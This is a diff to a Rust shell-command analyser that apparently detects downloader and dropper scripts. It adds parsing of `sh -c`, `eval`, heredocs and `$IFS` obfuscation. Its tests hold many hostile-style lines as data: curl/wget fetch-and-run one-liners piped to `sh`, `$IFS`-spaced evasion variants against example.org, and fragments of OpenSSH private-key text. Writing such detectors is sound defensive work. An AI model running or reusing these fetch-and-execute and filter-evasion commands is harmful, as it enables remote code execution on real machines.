@@ -19,7 +19,8 @@ const MAX_VALUE: usize = 512;
 /// level per link, so this is well above the depth of real scripts.
 const MAX_NEST: usize = 32;
 
-/// Longest command name `Step::Other` keeps.
+/// Longest command name `Step::Other` keeps, and longest part of a path
+/// taken for a payload: a line of base64 is neither.
 const MAX_NAME: usize = 32;
 
 /// What `Step::Other` holds for a word that is no plain command name, so
@@ -118,6 +119,8 @@ struct Word {
     text: Vec<u8>,
     quoted: bool,
     dynamic: bool,
+    /// Ranges of the `$( )` and backticks inside, without their delimiters.
+    subs: Vec<(usize, usize)>,
 }
 
 impl Word {
@@ -131,6 +134,19 @@ impl Word {
 
     fn url_like(&self) -> bool {
         self.dynamic || self.text.iter().any(|b| matches!(b, b'.' | b':' | b'/'))
+    }
+
+    /// The range inside, when the word is one substitution and nothing else.
+    fn only_substitution(&self) -> Option<(usize, usize)> {
+        let &[(start, end)] = self.subs.as_slice() else {
+            return None;
+        };
+        let opener = match self.text.as_slice() {
+            [b'$', b'(', ..] => 2,
+            [b'`', ..] => 1,
+            _ => return None,
+        };
+        (self.text.len() <= opener + (end - start) + 1).then_some((start, end))
     }
 }
 
@@ -205,9 +221,40 @@ impl<'a> Lexer<'a> {
                     let line = find(self.text, self.at, b'\n');
                     self.at = line;
                 }
+                (Some(b'$'), _) => match self.ifs_len() {
+                    Some(len) => self.at += len,
+                    None => return,
+                },
                 _ => return,
             }
         }
+    }
+
+    /// `$IFS` here, unquoted, is how payloads write a blank: its length, as
+    /// `$IFS`, `${IFS}` or `${IFS%??}`, with the `$9` or `$()` that may
+    /// follow it to end the name and expands to nothing.
+    fn ifs_len(&self) -> Option<usize> {
+        let rest = &self.text[self.at..];
+        let len = if let Some(tail) = rest.strip_prefix(b"$IFS") {
+            if tail
+                .first()
+                .is_some_and(|&b| b.is_ascii_alphanumeric() || b == b'_')
+            {
+                return None;
+            }
+            b"$IFS".len()
+        } else {
+            let tail = rest.strip_prefix(b"${IFS")?;
+            if !matches!(tail.first(), Some(b'}' | b'%' | b'#' | b':' | b'/' | b'^')) {
+                return None;
+            }
+            rest.iter().position(|&b| b == b'}')? + 1
+        };
+        Some(match &rest[len..] {
+            [b'$', b'1'..=b'9', ..] => len + 2,
+            [b'$', b'(', b')', ..] => len + 3,
+            _ => len,
+        })
     }
 
     fn next(&mut self) -> Tok {
@@ -311,7 +358,8 @@ impl<'a> Lexer<'a> {
             if matches!(
                 b,
                 b' ' | b'\t' | b'\r' | b'\n' | b';' | b'&' | b'|' | b'(' | b')' | b'<' | b'>'
-            ) {
+            ) || (b == b'$' && self.ifs_len().is_some())
+            {
                 break;
             }
             match b {
@@ -507,6 +555,7 @@ fn is_payload_path(path: &[u8]) -> bool {
     let relative: [&[u8]; 4] = [b"/", b"./", b"../", b"~/"];
     relative.iter().any(|p| path.starts_with(p))
         && !SYSTEM_DIRS.iter().any(|dir| path.starts_with(dir))
+        && path.split(|&b| b == b'/').all(|p| p.len() <= MAX_NAME)
 }
 
 /// `chmod` modes that set an execute bit.
@@ -780,6 +829,8 @@ struct Reader<'a> {
     xray: &'a mut Xray,
     budget: &'a mut Budget,
     queue: &'a mut VecDeque<usize>,
+    /// Layers whose output is run as code.
+    run_output: &'a mut Vec<usize>,
     layer: usize,
     text: &'a [u8],
     lex: Lexer<'a>,
@@ -791,6 +842,8 @@ struct Reader<'a> {
     stopped: bool,
     /// A substitution was refused.
     sealed: bool,
+    /// A shell reads the heredoc whose body comes next.
+    heredoc_runs: bool,
 }
 
 impl Reader<'_> {
@@ -813,8 +866,12 @@ impl Reader<'_> {
 
     fn run(&mut self) -> List {
         while !self.stopped {
-            let tok = self.lex.next();
-            self.open_substitutions();
+            let mut tok = self.lex.next();
+            let subs = take(&mut self.lex.subs);
+            self.open_substitutions(&subs);
+            if let Tok::Word(word) = &mut tok {
+                word.subs = subs;
+            }
             match tok {
                 Tok::End => {
                     self.end_command();
@@ -836,23 +893,60 @@ impl Reader<'_> {
         take(&mut self.root.list)
     }
 
-    /// Open what the lexer passed. The first refusal is the only one noted:
-    /// the rest of this layer stays closed.
-    fn open_substitutions(&mut self) {
-        for (start, end) in take(&mut self.lex.subs) {
-            let inner = self.text[start..end].to_vec();
-            if self.sealed || inner.iter().all(u8::is_ascii_whitespace) {
-                continue;
-            }
+    fn open_substitutions(&mut self, subs: &[(usize, usize)]) {
+        for &(start, end) in subs {
             let at = Span {
                 layer: self.layer,
                 start,
                 end,
             };
-            let (kind, parent) = (LayerKind::Shell, self.layer);
-            let noted = self.xray.opaque.len();
-            open(self.xray, parent, kind, at, inner, self.budget, self.queue);
-            self.sealed = self.xray.opaque.len() > noted;
+            self.open_shell(at, self.text[start..end].to_vec());
+        }
+    }
+
+    /// Open a `Shell` child. The first refusal is the only one noted: the
+    /// rest of this layer stays closed.
+    fn open_shell(&mut self, at: Span, text: Vec<u8>) {
+        if self.sealed || text.iter().all(u8::is_ascii_whitespace) {
+            return;
+        }
+        let (kind, parent) = (LayerKind::Shell, self.layer);
+        let noted = self.xray.opaque.len();
+        open(self.xray, parent, kind, at, text, self.budget, self.queue);
+        self.sealed = self.xray.opaque.len() > noted;
+    }
+
+    /// `words` are code a shell runs. One substitution alone needs no layer
+    /// of its own: what it prints is the code.
+    fn open_script(&mut self, words: &[Word]) {
+        match words {
+            [] => {}
+            [word] => match word.only_substitution() {
+                Some(sub) => self.output_is_run(sub),
+                None => self.open_shell(word.span(self.layer), word.text.clone()),
+            },
+            [first, .., last] => {
+                let at = Span {
+                    layer: self.layer,
+                    start: first.start,
+                    end: last.end,
+                };
+                let parts: Vec<&[u8]> = words.iter().map(|w| w.text.as_slice()).collect();
+                self.open_shell(at, parts.join(&b' '));
+            }
+        }
+    }
+
+    /// The substitution may have been refused, or be open already under
+    /// another parent, so it is found by its text.
+    fn output_is_run(&mut self, (start, end): (usize, usize)) {
+        let text = &self.text[start..end];
+        let layer = self.xray.layers.iter().position(|l| l.text == text);
+        if !text.is_empty()
+            && let Some(layer) = layer
+            && !self.run_output.contains(&layer)
+        {
+            self.run_output.push(layer);
         }
     }
 
@@ -1008,14 +1102,27 @@ impl Reader<'_> {
             if cmd.out.is_some() {
                 self.save_pipeline();
             }
-            return;
+        } else {
+            let (words, assigned) = unwrap_command(&cmd.words);
+            if assigned {
+                self.emit(Step::Prepare("set".to_string()));
+            }
+            if let [head, args @ ..] = words {
+                self.command(head, args, &cmd);
+            }
         }
-        let (words, assigned) = unwrap_command(&cmd.words);
-        if assigned {
-            self.emit(Step::Prepare("set".to_string()));
-        }
-        if let [head, args @ ..] = words {
-            self.command(head, args, &cmd);
+        // The body comes at the newline, which may end a later command:
+        // `sh <<EOF &`, `cat <<EOF | sh`.
+        if self.heredoc_runs
+            && let Some((start, end)) = cmd.body
+        {
+            self.heredoc_runs = false;
+            let at = Span {
+                layer: self.layer,
+                start,
+                end,
+            };
+            self.open_shell(at, self.text[start..end].to_vec());
         }
     }
 
@@ -1023,10 +1130,10 @@ impl Reader<'_> {
         if self.stopped {
             return;
         }
-        if self.budget.pieces == 0 {
+        if self.budget.steps == 0 {
             return self.over(OpaqueReason::OverLimit);
         }
-        self.budget.pieces -= 1;
+        self.budget.steps -= 1;
         self.top().stages.push(Node::Step(step), 0);
     }
 
@@ -1076,6 +1183,9 @@ impl Reader<'_> {
             end,
         });
         let out = cmd.out.as_ref();
+        if let Some(sub) = head.only_substitution() {
+            self.output_is_run(sub);
+        }
         if is_payload_path(&head.text) {
             return self.run_binary(head, args);
         }
@@ -1111,10 +1221,23 @@ impl Reader<'_> {
                 let file = args.iter().find(|w| !w.text.starts_with(b"-"));
                 self.write(None, file);
             }
-            _ if SHELLS.contains(&name) => self.run_interpreter(name, b"c", true, args),
+            // Bare words are opened too, but only quoted or expanding ones
+            // show that this is no sentence.
+            b"eval" if !args.is_empty() => {
+                self.open_script(args);
+                self.emit(if args.iter().any(|w| w.quoted || w.dynamic) {
+                    Step::Run {
+                        what: plain_name(name),
+                        tag: None,
+                    }
+                } else {
+                    Step::Other(plain_name(name))
+                });
+            }
+            _ if SHELLS.contains(&name) => self.run_interpreter(name, b"c", true, body, args),
             _ => {
                 if let Some((_, inline)) = INTERPRETERS.iter().find(|(n, _)| *n == name) {
-                    self.run_interpreter(name, inline, false, args);
+                    self.run_interpreter(name, inline, false, None, args);
                 } else if self.is_dropped(name) {
                     self.run_binary(head, args);
                 } else {
@@ -1177,7 +1300,16 @@ impl Reader<'_> {
 
     /// A shell or interpreter: `sh -s <tag>` reads its input, `sh <file>
     /// <tag>` runs the file, and `sh -c …` carries its code as an argument.
-    fn run_interpreter(&mut self, name: &[u8], inline: &[u8], shell: bool, args: &[Word]) {
+    /// A heredoc to a shell is read as shell, with `body` the one that came
+    /// with this command, if it did.
+    fn run_interpreter(
+        &mut self,
+        name: &[u8],
+        inline: &[u8],
+        shell: bool,
+        body: Option<Span>,
+        args: &[Word],
+    ) {
         let mut rest = args;
         let mut reads_input = false;
         let mut has_code = false;
@@ -1209,7 +1341,12 @@ impl Reader<'_> {
             return self.emit(Step::Other(plain_name(name)));
         }
         if has_code {
+            if shell {
+                self.open_script(&rest[..rest.len().min(1)]);
+            }
             rest = &[];
+        } else if shell && what.is_none() {
+            self.heredoc_runs = body.is_some() || self.lex.heredoc.is_some();
         }
         if let Some(file) = what {
             rest = &rest[1..];
@@ -1302,7 +1439,7 @@ fn walk(nodes: &mut [Node], visit: &mut impl FnMut(&mut Step)) {
 
 fn is_runner(what: &str) -> bool {
     let what = what.as_bytes();
-    SHELLS.contains(&what) || INTERPRETERS.iter().any(|(name, _)| *name == what)
+    what == b"eval" || SHELLS.contains(&what) || INTERPRETERS.iter().any(|(name, _)| *name == what)
 }
 
 fn render_step(step: &Step, out: &mut String) {
@@ -1348,22 +1485,34 @@ fn render(nodes: &[Node], separator: &str, out: &mut String) {
     }
 }
 
-/// Read `layer` as shell and push its recipe, then do the same for every
-/// `$( )` and backtick inside, each opened as a `Shell` child layer. So call
-/// this on the layers around them only, not on `Shell` layers. A layer that
-/// fetches, runs or writes nothing is no recipe, and costs no pieces.
+/// Read `layer` as shell and push its recipe, then do the same for all the
+/// code inside it, each opened as a `Shell` child layer: `$( )`, backticks,
+/// `sh -c`, `eval` and heredocs to a shell. So call this on the layers around
+/// them only, not on `Shell` layers. A layer that fetches, runs or writes
+/// nothing is no recipe, and costs no steps.
 // Nothing outside the tests calls this until the piece extractor does; the
 // allow also keeps what it uses alive.
 #[allow(dead_code)]
 pub(crate) fn read_recipes(xray: &mut Xray, layer: usize, budget: &mut Budget) {
     let mut queue = VecDeque::from([layer]);
+    let mut run_output = Vec::new();
     while let Some(at) = queue.pop_front() {
         if at >= xray.layers.len() {
             continue;
         }
         let text = take(&mut xray.layers[at].text);
-        read_layer(xray, at, &text, budget, &mut queue);
+        read_layer(xray, at, &text, budget, &mut queue, &mut run_output);
         xray.layers[at].text = text;
+    }
+    // Last, as the run may come after the layer holding the fetch was read.
+    for recipe in &mut xray.recipes {
+        if run_output.contains(&recipe.layer) {
+            walk(&mut recipe.nodes, &mut |step| {
+                if let Step::Fetch { saves, .. } = step {
+                    *saves = true;
+                }
+            });
+        }
     }
 }
 
@@ -1373,12 +1522,14 @@ fn read_layer(
     text: &[u8],
     budget: &mut Budget,
     queue: &mut VecDeque<usize>,
+    run_output: &mut Vec<usize>,
 ) {
-    let pieces = budget.pieces;
+    let steps = budget.steps;
     let mut reader = Reader {
         xray,
         budget,
         queue,
+        run_output,
         layer,
         text,
         lex: Lexer::new(text),
@@ -1389,6 +1540,7 @@ fn read_layer(
         files: Vec::new(),
         stopped: false,
         sealed: false,
+        heredoc_runs: false,
     };
     let mut nodes = reader.run().nodes;
     let files = reader.files;
@@ -1402,7 +1554,7 @@ fn read_layer(
         }
     });
     if !worth_keeping {
-        budget.pieces = pieces;
+        budget.steps = steps;
         return;
     }
     let mut normal = String::new();
@@ -1429,7 +1581,9 @@ fn read_layer(
 
 #[cfg(test)]
 mod tests {
-    use super::super::{MAX_LAYERS, MAX_OUTPUT, MAX_PIECES, OpaqueReason, Recipe};
+    use super::super::{
+        MAX_DEPTH, MAX_LAYERS, MAX_OUTPUT, MAX_PIECES, MAX_STEPS, OpaqueReason, Recipe,
+    };
     use super::*;
 
     fn read(text: &str) -> Xray {
@@ -1724,7 +1878,7 @@ mod tests {
         assert_eq!(x.opaque, []);
 
         let x = read(&"wget http://example.org/x;".repeat(10_000));
-        assert_eq!(steps(&only(&x).nodes).len(), MAX_PIECES);
+        assert_eq!(steps(&only(&x).nodes).len(), MAX_STEPS);
         assert!(over_limit(&x));
         assert!(only(&x).normal.len() <= MAX_VALUE);
     }
@@ -1762,22 +1916,31 @@ mod tests {
     }
 
     #[test]
-    fn budget_is_spent_on_steps_and_shared_between_layers() {
-        let mut x = Xray::new(b"cd /tmp; wget http://example.org/x; ./x tag");
+    fn steps_have_their_own_budget_shared_between_layers() {
+        let body: &[u8] = b"cd /tmp; wget http://example.org/x; ./x tag";
+        let mut x = Xray::new(body);
         let mut budget = Budget::default();
         read_recipes(&mut x, 0, &mut budget);
-        assert_eq!(budget.pieces, MAX_PIECES - 3);
+        assert_eq!(budget.steps, MAX_STEPS - 3);
+        assert_eq!(budget.pieces, MAX_PIECES, "left to the piece extractor");
 
-        let mut x = Xray::new(b"cd /tmp; wget http://example.org/x; ./x tag");
+        let mut x = Xray::new(body);
         let mut budget = Budget {
-            pieces: 2,
+            steps: 2,
             ..Budget::default()
         };
         read_recipes(&mut x, 0, &mut budget);
         assert_eq!(steps(&only(&x).nodes).len(), 2);
-        assert_eq!(budget.pieces, 0);
+        assert_eq!(budget.steps, 0);
+        assert_eq!(budget.pieces, MAX_PIECES);
         assert!(over_limit(&x));
         assert_eq!(x.opaque[0].at.layer, 0);
+
+        let mut x = Xray::new(&b"wget http://example.org/x;".repeat(1000));
+        let mut budget = Budget::default();
+        read_recipes(&mut x, 0, &mut budget);
+        assert_eq!(budget.steps, 0);
+        assert_eq!(budget.pieces, MAX_PIECES, "a long recipe starves no pieces");
     }
 
     #[test]
@@ -1798,7 +1961,7 @@ mod tests {
         let long = "a".repeat(MAX_VALUE + 1);
         for line in [
             format!("rm -f a; ./x {long}; rm x"),
-            format!("rm -f a; /tmp/{long} tag; rm x"),
+            format!("rm -f a; /tmp{} tag; rm x", "/a".repeat(MAX_VALUE / 2 + 1)),
             format!("rm -f a; ./x tag; wget http://example.org/{long}; rm x"),
             format!(
                 "rm -f a; ./x tag; echo {}; rm x",
@@ -2000,7 +2163,8 @@ mod tests {
         let mut x = Xray::new(&b"word another\n".repeat(400));
         let mut budget = Budget::default();
         read_recipes(&mut x, 0, &mut budget);
-        assert_eq!(budget.pieces, MAX_PIECES, "nothing kept, nothing spent");
+        assert_eq!(budget.steps, MAX_STEPS, "nothing kept, nothing spent");
+        assert!(over_limit(&x), "reading still stopped, so it says so");
     }
 
     #[test]
@@ -2118,7 +2282,7 @@ mod tests {
             let x = read_bytes(&body);
             assert!(x.layers.len() <= MAX_LAYERS);
             for recipe in &x.recipes {
-                assert!(steps(&recipe.nodes).len() <= MAX_PIECES);
+                assert!(steps(&recipe.nodes).len() <= MAX_STEPS);
                 assert!(recipe.normal.len() <= MAX_VALUE);
                 assert!(recipe.layer < x.layers.len());
                 for step in steps(&recipe.nodes) {
@@ -2138,10 +2302,221 @@ mod tests {
 
     #[test]
     fn a_full_layer_list_is_noted_once() {
-        let x = read(&"$(id)".repeat(1000));
+        let body: String = (0..1000).map(|i| format!("$(id {i})")).collect();
+        let x = read(&body);
         assert_eq!(x.layers.len(), MAX_LAYERS);
         assert_eq!(x.opaque.len(), 1);
         assert!(over_limit(&x));
+    }
+
+    fn shell_layers(x: &Xray) -> Vec<&[u8]> {
+        x.layers
+            .iter()
+            .filter(|l| l.kind == LayerKind::Shell)
+            .map(|l| l.text.as_slice())
+            .collect()
+    }
+
+    /// `saves` of every fetch in every recipe, in recipe order.
+    fn all_saved(x: &Xray) -> Vec<bool> {
+        x.recipes
+            .iter()
+            .flat_map(|r| steps(&r.nodes))
+            .filter(|s| matches!(s, Step::Fetch { .. }))
+            .map(|s| fetch(x, s).2)
+            .collect()
+    }
+
+    #[test]
+    fn inline_scripts_open_as_shell_layers() {
+        const SCRIPT: &[u8] = b"wget http://example.org/a -O /tmp/a; sh /tmp/a tag";
+        for line in [
+            "sh -c 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
+            "sh -c \"wget http://example.org/a -O /tmp/a; sh /tmp/a tag\"",
+            "bash -c 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
+            "/bin/bash -ec 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
+            "nohup sh -c 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag' &",
+            "eval 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
+            "eval \"wget http://example.org/a -O /tmp/a; sh /tmp/a tag\"",
+        ] {
+            let x = read(line);
+            assert_eq!(shell_layers(&x), [SCRIPT], "{line}");
+            let child = &x.layers[1];
+            assert_eq!(child.parent, Some(0));
+            let from = child.from.unwrap();
+            assert_eq!(&x.layers[0].text[from.start..from.end], SCRIPT, "{line}");
+            let inner = x.recipes.iter().find(|r| r.layer == 1).expect(line);
+            let found = steps(&inner.nodes);
+            assert_eq!(fetch(&x, found[0]).1, "http://example.org/a", "{line}");
+            assert_eq!(*found[1], run("/tmp/a", Some("tag")), "{line}");
+            assert_eq!(all_saved(&x), [true], "{line}");
+        }
+        // Escapes are gone from the layer's text, as the shell would read it.
+        let x = read(r#"sh -c "wget \"http://example.org/a\" -O /tmp/a""#);
+        assert_eq!(
+            shell_layers(&x),
+            [&b"wget \"http://example.org/a\" -O /tmp/a"[..]]
+        );
+        // Bare words count too; `eval` joins them.
+        let x = read("eval wget -O /tmp/a http://example.org/a");
+        assert_eq!(
+            shell_layers(&x),
+            [&b"wget -O /tmp/a http://example.org/a"[..]]
+        );
+        assert_eq!(all_saved(&x), [true]);
+        // An `eval` of something is a run; prose is neither run nor recipe.
+        assert_eq!(
+            steps(&read("eval 'id'").recipes[0].nodes),
+            [&run("eval", None)]
+        );
+        assert_eq!(read("eval is not a word here").recipes, []);
+        assert_eq!(read("perl -e 'wget http://example.org/a'").layers.len(), 1);
+    }
+
+    #[test]
+    fn nested_inline_scripts_stop_at_the_depth_limit() {
+        let x = read(&format!("{}wget http://example.org/x", "eval ".repeat(20)));
+        assert_eq!(x.layers.len(), MAX_DEPTH + 1, "raw plus 6");
+        assert!(too_deep(&x));
+    }
+
+    #[test]
+    fn output_of_a_substitution_run_as_code_saves_the_fetch() {
+        for line in [
+            "sh -c \"$(curl -fsSL http://example.org/x)\"",
+            "bash -c \"$(wget -qO- http://example.org/x)\"",
+            "sh -c \"`curl -s http://example.org/x`\"",
+            "eval \"$(wget -qO- http://example.org/x)\"",
+            "eval $(curl -s http://example.org/x)",
+            "eval `curl -s http://example.org/x`",
+            "$(curl -s http://example.org/x)",
+            "`curl -s http://example.org/x`",
+            // Not the whole script, but in command position.
+            "sh -c \"cd /tmp; $(curl -s http://example.org/x)\"",
+            "sh -c \"$(curl -s http://example.org/x) arg\"",
+        ] {
+            assert_eq!(all_saved(&read(line)), [true], "{line}");
+        }
+        // Run after the same text was opened elsewhere.
+        let x = read(
+            "echo $(curl -s http://example.org/x); \
+             sh -c \"$(curl -s http://example.org/x)\"",
+        );
+        assert_eq!(all_saved(&x), [true]);
+        let x = read(
+            "echo $(curl -s http://example.org/x); \
+             echo $(sh -c \"$(curl -s http://example.org/x)\")",
+        );
+        assert_eq!(all_saved(&x), [true]);
+        // Empty substitutions print nothing, and are no layer to find.
+        let x = read("wget http://example.org/x; $()");
+        assert_eq!(all_saved(&x), [false]);
+        // The output goes somewhere that is no shell.
+        for line in [
+            "echo $(curl -s http://example.org/x)",
+            "a=$(curl -s http://example.org/x)",
+            "sh -c \"echo $(curl -s http://example.org/x)\"",
+            "eval \"echo $(curl -s http://example.org/x)\"",
+        ] {
+            assert_eq!(all_saved(&read(line)), [false], "{line}");
+        }
+    }
+
+    #[test]
+    fn ifs_is_a_blank() {
+        for line in [
+            "wget${IFS}http://example.org/x${IFS}-O${IFS}/tmp/x;sh${IFS}/tmp/x${IFS}tag",
+            "wget$IFS'http://example.org/x'$IFS-O$IFS/tmp/x;sh$IFS/tmp/x$IFS'tag'",
+            "wget${IFS%??}http://example.org/x${IFS%??}-O${IFS%??}/tmp/x;sh${IFS%??}/tmp/x${IFS%??}tag",
+            "wget$IFS$9http://example.org/x$IFS$9-O$IFS$9/tmp/x;sh$IFS$9/tmp/x$IFS$9tag",
+            "wget${IFS}$9http://example.org/x ${IFS} -O /tmp/x;${IFS}sh /tmp/x tag",
+            "sh -c 'wget${IFS}http://example.org/x${IFS}-O${IFS}/tmp/x;sh${IFS}/tmp/x${IFS}tag'",
+        ] {
+            let x = read(line);
+            let inner = x.recipes.last().expect(line);
+            let found = steps(&inner.nodes);
+            assert_eq!(fetch(&x, found[0]).1, "http://example.org/x", "{line}");
+            assert_eq!(*found[1], run("/tmp/x", Some("tag")), "{line}");
+            assert_eq!(all_saved(&x), [true], "{line}");
+        }
+        // Other variables stay in their word, and quotes keep it whole.
+        let x = read("wget http://example.org/$IFSX -O /tmp/x; ./$IFSX");
+        assert_eq!(
+            fetch(&x, steps(&only(&x).nodes)[0]).1,
+            "http://example.org/$IFSX"
+        );
+        let x = read("wget \"http://example.org/${IFS}x\" -O /tmp/x");
+        assert_eq!(
+            fetch(&x, steps(&only(&x).nodes)[0]).1,
+            "http://example.org/${IFS}x"
+        );
+        // Cut text ends the word; it does not loop.
+        for body in ["$IFS", "${IFS", "${IFS%", "wget${IFS", "$IFS$", "$IFS$9"] {
+            read(body);
+        }
+    }
+
+    #[test]
+    fn heredoc_to_a_shell_is_read_as_shell() {
+        const SCRIPT: &[u8] = b"cd /tmp\nwget -qO- http://example.org/x | sh -s apache\n";
+        let body = String::from_utf8_lossy(SCRIPT);
+        for line in [
+            format!("sh <<EOF\n{body}EOF\n"),
+            format!("bash <<'EOF'\n{body}EOF\n"),
+            format!("sh -s t <<-EOF\n{body}EOF\n"),
+            format!("/bin/sh << EOF\n{body}EOF\nrm x\n"),
+            format!("cat <<EOF | sh\n{body}EOF\n"),
+            format!("sh <<EOF\n{body}"),
+            // The newline the body waits for is behind other commands.
+            format!("sh <<EOF &\n{body}EOF\n"),
+            format!("nohup sh <<EOF && rm x\n{body}EOF\n"),
+            format!("sh <<EOF | tee /tmp/l\n{body}EOF\n"),
+        ] {
+            let x = read(&line);
+            assert_eq!(shell_layers(&x), [SCRIPT], "{line}");
+            let inner = x.recipes.iter().find(|r| r.layer == 1).expect(&line);
+            assert!(
+                steps(&inner.nodes).contains(&&run("sh", Some("apache"))),
+                "{line}"
+            );
+            assert_eq!(all_saved(&x), [true], "{line}");
+            let from = x.layers[1].from.unwrap();
+            assert_eq!(&x.layers[0].text[from.start..from.end], SCRIPT, "{line}");
+        }
+        // Handed to anything else it stays data.
+        for line in [
+            format!("cat > /tmp/k <<EOF\n{body}EOF\n"),
+            format!("sh /tmp/a <<EOF\n{body}EOF\n"),
+            format!("python3 <<EOF\n{body}EOF\n"),
+        ] {
+            assert_eq!(shell_layers(&read(&line)), [&[] as &[u8]; 0], "{line}");
+        }
+    }
+
+    #[test]
+    fn key_text_stays_out_of_steps_in_a_heredoc_to_a_shell() {
+        let line = "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt";
+        let slash = "/3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt";
+        let split = "/tmp/3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAt";
+        for body in [
+            // Written by a heredoc inside the heredoc.
+            format!("cat > /tmp/k <<K\n{slash}\n{line}\nK\nscp -i /tmp/k u@example.org:/a a\n"),
+            // A pasted block: reading stops at the marker.
+            format!("./x t\n-----BEGIN OPENSSH PRIVATE KEY-----\n{slash}\n{line}\n"),
+            // Lines with no marker at all are no commands to keep.
+            format!("./x t\n{slash}\n{line}\n{split}\n"),
+            // Quoted, it is only a span.
+            format!("echo \"{slash}\" >> /tmp/k; echo \"{line}\" >> /tmp/k; sh /tmp/k\n"),
+        ] {
+            for wrapped in [format!("sh <<EOF\n{body}EOF\n"), format!("eval '{body}'")] {
+                let x = read(&wrapped);
+                assert!(!x.recipes.is_empty(), "{wrapped}");
+                let kept = format!("{:?}", x.recipes);
+                for key in [line, slash, split] {
+                    assert!(!kept.contains(key), "{wrapped}");
+                }
+            }
+        }
     }
 
     #[test]
